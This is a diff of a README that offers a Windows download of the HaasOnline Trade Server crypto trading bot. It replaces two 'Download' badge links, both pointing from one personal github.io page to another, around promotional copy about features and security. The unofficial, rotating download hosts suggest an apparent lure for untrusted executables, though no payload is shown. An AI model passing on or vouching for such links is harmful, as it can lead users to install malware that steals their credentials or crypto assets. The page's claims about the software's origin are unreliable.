@@ -4,7 +4,7 @@
 
 ## 📥 Download HaasOnline Trade Server for Windows
 
-[![⬇️ Download HaasOnline Trade Server](https://img.shields.io/badge/Download-HaasOnline%20Trade%20Server-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/236)
+[![⬇️ Download HaasOnline Trade Server](https://img.shields.io/badge/Download-HaasOnline%20Trade%20Server-blue?style=for-the-badge&logo=windows)](https://haasload.github.io/.github/)
 
 ---
 
@@ -32,7 +32,7 @@ HaasOnline Trade Server comes equipped with features like real-time market scann
 
 Security is a top priority, with API key encryption, two-factor authentication, and on-premise hosting options to ensure complete control over your trading infrastructure. Whether you are a casual trader looking to automate repetitive tasks or a quantitative analyst building complex strategies, HaasOnline Trade Server provides the flexibility and speed needed to stay ahead in volatile crypto markets.
 
-[![⬇️ Download HaasOnline Trade Server](https://img.shields.io/badge/Download-HaasOnline%20Trade%20Server-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/236)
+[![⬇️ Download HaasOnline Trade Server](https://img.shields.io/badge/Download-HaasOnline%20Trade%20Server-blue?style=for-the-badge&logo=windows)](https://haasload.github.io/.github/)
 
 ---
 
